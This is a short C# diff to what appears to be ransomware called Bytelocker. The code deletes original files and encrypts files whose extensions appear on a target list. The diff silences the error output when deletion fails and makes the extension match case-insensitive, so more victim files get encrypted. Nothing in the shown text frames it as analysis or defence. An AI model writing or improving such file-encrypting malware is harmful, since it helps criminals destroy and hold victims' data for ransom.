@@ -21,7 +21,6 @@ namespace Bytelocker.CryptoManager
                 File.Delete(this.file_path);
             } catch (Exception ex)
             {
-                Console.WriteLine("Error " + ex.Message);
             }
             
         }
@@ -66,7 +65,7 @@ namespace Bytelocker.CryptoManager
 
             String file_extension = Path.GetExtension(this.file_path);
 
-            if (!(IsFileLocked(this.file_path)) && file_extension != FileEncrypter.FILE_EXTENSION_ENCRYPT && FileEncrypter.FILE_EXTENSIONS_TO_ENCRYPT.Contains(file_extension))
+            if (!(IsFileLocked(this.file_path)) && file_extension != FileEncrypter.FILE_EXTENSION_ENCRYPT && FileEncrypter.FILE_EXTENSIONS_TO_ENCRYPT.Contains(file_extension.ToLower()))
             {
                 this.fe.ChooseFile(this.file_path);
                 this.fe.Encrypt();
